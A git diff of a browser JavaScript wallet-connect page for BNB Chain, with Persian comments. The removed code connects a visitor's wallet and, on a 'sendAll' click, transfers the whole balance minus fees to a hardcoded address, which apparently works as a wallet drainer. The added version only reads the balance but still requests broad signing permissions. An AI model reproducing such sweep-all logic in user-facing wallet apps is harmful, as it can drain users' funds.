@@ -1,50 +1,68 @@
 import { ethers } from "ethers";
-import EthereumProvider from "@walletconnect/ethereum-provider";
+import {
+  WalletConnectModalSign
+} from "@walletconnect/modal-sign-html";
 
-let provider, ethersProvider, signer, userAddress;
+// جایگزین کن با projectId خودت
+const projectId = "YOUR_WALLETCONNECT_PROJECT_ID"; 
 
-document.getElementById("connect").onclick = async () => {
-  provider = await EthereumProvider.init({
-    projectId: "4d08946e6c316bed5e76b450ccbb5256", // ← از WalletConnect Cloud بگیر
-    chains: [56],
-    showQrModal: true,
-  });
+const modal = new WalletConnectModalSign({
+  projectId,
+  enableExplorer: false, // اختیاری: برای غیرفعال کردن modal wallet explorer
+  metadata: {
+    name: "BNB Wallet App",
+    description: "WalletConnect BNB Example",
+    url: "http://localhost",
+    icons: ["https://walletconnect.com/walletconnect-logo.png"],
+  },
+  explorerRecommendedWalletIds: [
+    // لیست ولت‌هایی که پشتیبانی کنیم (فقط موبایل)
+    "trust",
+    "metamask"
+  ],
+  mobileWallets: [
+    {
+      id: "trust",
+      name: "Trust Wallet",
+      homepage: "https://trustwallet.com",
+      universalLink: "https://link.trustwallet.com/wc",
+      nativeLink: "trust://"
+    },
+    {
+      id: "metamask",
+      name: "MetaMask",
+      homepage: "https://metamask.io",
+      universalLink: "https://metamask.app.link/wc",
+      nativeLink: "metamask://"
+    }
+  ]
+});
 
-  await provider.enable();
+const connectBtn = document.getElementById("connectBtn");
+const addressSpan = document.getElementById("address");
+const balanceSpan = document.getElementById("balance");
 
-  ethersProvider = new ethers.BrowserProvider(provider);
-  signer = await ethersProvider.getSigner();
-  userAddress = await signer.getAddress();
+connectBtn.addEventListener("click", async () => {
+  try {
+    const session = await modal.connect({
+      requiredNamespaces: {
+        eip155: {
+          methods: ["eth_sendTransaction", "eth_sign", "personal_sign", "eth_signTypedData"],
+          chains: ["eip155:56"],
+          events: ["chainChanged", "accountsChanged"],
+        },
+      },
+    });
 
-  document.getElementById("address").innerText = "آدرس کیف پول: " + userAddress;
+    const account = session.namespaces.eip155.accounts[0];
+    const address = account.split(":")[2];
+    addressSpan.textContent = address;
 
-  const balance = await ethersProvider.getBalance(userAddress);
-  const bnb = ethers.formatEther(balance);
-  document.getElementById("balance").innerText = "موجودی BNB: " + bnb;
-};
-
-document.getElementById("sendAll").onclick = async () => {
-  const toAddress = "0x91f704D414979fB1ac168084B4C2651a3C3508d3"; // ← آدرس مقصد شما
-
-  const gasPrice = await ethersProvider.getFeeData();
-  const balance = await ethersProvider.getBalance(userAddress);
-
-  const gasLimit = BigInt(21000);
-  const totalFee = gasPrice.gasPrice * gasLimit;
-
-  if (balance <= totalFee) {
-    alert("موجودی کافی برای پرداخت کارمزد وجود ندارد.");
-    return;
+    const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
+    const balance = await provider.getBalance(address);
+    const bnb = ethers.formatEther(balance);
+    balanceSpan.textContent = `${bnb} BNB`;
+  } catch (err) {
+    console.error("Connection failed", err);
   }
-
-  const valueToSend = balance - totalFee;
-
-  const tx = await signer.sendTransaction({
-    to: toAddress,
-    value: valueToSend,
-    gasLimit,
-    gasPrice: gasPrice.gasPrice,
-  });
-
-  alert("تراکنش ارسال شد:\n" + tx.hash);
-};
+});
